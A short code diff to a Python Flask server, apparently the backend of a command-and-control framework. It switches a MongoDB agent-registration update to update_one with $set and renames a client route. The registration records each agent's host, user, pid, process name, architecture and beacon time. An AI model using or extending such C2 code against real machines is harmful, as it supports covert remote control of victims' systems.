@@ -35,18 +35,20 @@ def register():
 
         key = data[0]
 
-        agent = agents.find_one(
-            { "key":key }
-        )
+        filter = {'key': key}
 
-        agent.update({ 
-            'host': data[1],
-            'user': data[2],
-            'pid': data[3],
-            'name': data[4],
-            'arch': data[5],
-            'beacon': datetime.now().strftime("%H:%M:%S")
-        })
+        values = { 
+            "$set": {
+                'host': data[1],
+                'user': data[2],
+                'pid': data[3],
+                'name': data[4],
+                'arch': data[5],
+                'beacon': datetime.now().strftime("%H:%M:%S")
+            }
+        }
+
+        agents.update_one(filter, values)
 
         return "response"
 
@@ -69,7 +71,7 @@ def negotiate():
 def beacon():
     return "response"
 
-@app.route('/api/client/get')
+@app.route('/api/client/agents')
 def get():
     r = agents.find()
     l = list(r)
